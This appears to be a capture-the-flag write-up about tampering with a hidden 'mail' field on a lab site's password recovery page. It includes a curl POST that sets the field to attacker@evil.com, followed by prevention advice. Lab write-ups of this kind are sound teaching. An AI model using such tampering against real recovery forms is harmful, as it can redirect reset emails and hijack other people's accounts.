# Hidden Input Tampering

The password recovery page at `/?page=recover` contains a hidden input:

```html
<input type="hidden" name="mail" value="webmaster@borntosec.com">
```

The server uses this client-supplied value without validation. Changing it triggers the flag.

## Exploit

In browser DevTools, find the hidden `mail` input, change its value to anything, and submit
the form.

```bash
curl -X POST "http://<IP>/index.php?page=recover" \
     --data "mail=attacker@evil.com&Submit=Submit"
```

## How to prevent

- Never trust hidden form fields for sensitive values — they are fully client-controlled
- Store the target email server-side (in session or DB), not in the form
